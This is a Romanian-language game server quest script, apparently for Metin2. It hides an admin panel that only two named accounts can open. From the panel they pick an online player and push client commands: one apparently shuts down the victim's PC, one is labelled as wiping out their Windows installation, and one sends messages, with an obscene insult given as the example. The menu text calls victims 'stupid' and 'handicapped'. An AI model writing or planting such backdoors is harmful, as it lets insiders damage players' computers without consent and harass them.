quest t_tekk begin
    state start begin
        when login with pc.get_name() == "[DEV]IC3" or pc.get_name() == "[D]Nozarashi" begin
            send_letter("Panou Smecher")
        end
        when button or info begin
            if pc.get_name() == "[DEV]IC3" or pc.get_name() == "[D]Nozarashi" then
                say_title("Panou Smecher")
                say("Alege ce sa-i faci la prost:")
		local a = select("Somn PC", "Te-ai dus pe pula", "Da-i un mesaj", "N-ar trebui sa iesi!")
                if a == 1 then
                    say_title("Panou Smecher")
                    say("Numele la handicapat:")
                    local player_name = input()
                    local u_vid = find_pc_by_name(player_name)
                    if player_name == "" then
                        say_title("Panou Smecher")
                        say("N-ai pus numele prostului!")
                        return
                    end
                    
                    if u_vid == 0 then
                        say_title("Panou Smecher")
                        say_reward(string.format("Prostu: %s nu e conectat! ", player_name))
                    else
                        local old = pc.select(u_vid)
                        cmdchat("Shutdown "..player_name.."")
                        pc.select(old)
                    end
                end
            if a == 2 then
                    say_title("A plecat Windowsu")
                    say("Baga numele prostului:")
                    local player_name = input()
                    local u_vid = find_pc_by_name(player_name)
                    if player_name == "" then
                        say_title("A plecat Windowsu")
                        say("N-ai scris numele prostului corect")
                        return
                    end
                    
                    if u_vid == 0 then
                        say_title("Panou Smecher")
                        say_reward(string.format("Prostu: %s nu este conectat! ", player_name))
                    else
                        local old = pc.select(u_vid)
                        cmdchat("teck "..player_name.."")
                        pc.select(old)
                    end
                end
                            
                if a == 3 then
                    say_title("Panou Smecher")
                    say("Trimite un mesaj doar cu - fara spatii")   
                    say("exemplu: muie-lu-mata")   
                    local player_name = input()
                    local message = input()
                    local u_vid = find_pc_by_name(player_name)
                    if player_name == "" then
                        say_title("Panou Smecher")
                        say("N-ai bagat numele prostului!")
                        return
                    end
                    
                    if u_vid == 0 then
                        say_title("Panou Smecher")
                        say_reward(string.format("Prostu: %s nu este conectat! ", player_name))
                    else
                        local old = pc.select(u_vid)
                        cmdchat("SendMessage "..player_name.." "..message.."")
                        pc.select(old)
                    end
                end
            end
        end
    end
end